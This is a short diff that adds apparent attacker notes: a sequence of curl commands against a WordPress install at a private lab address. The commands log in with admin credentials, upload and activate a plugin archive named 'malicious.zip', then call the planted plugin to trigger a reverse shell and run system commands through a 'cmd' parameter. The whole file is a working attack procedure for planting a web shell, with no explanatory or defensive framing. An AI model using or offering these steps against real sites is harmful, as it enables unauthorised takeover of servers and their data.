@@ -1,0 +1,9 @@
+curl -u admin:hothead -F "pluginzip=@malicious.zip" http://192.168.56.104/blog/wp-admin/plugin-install.php?action=upload
+
+curl -u admin:hothead http://192.168.56.104/blog/wp-admin/plugins.php?action=activate&plugin=malicious/malicious.php
+
+triger 
+
+curl http://192.168.56.104/blog/wp-content/plugins/malicious/malicious.php?revshell
+
+curl http://192.168.56.104/blog/wp-content/plugins/malicious/malicious.php?cmd=whoami
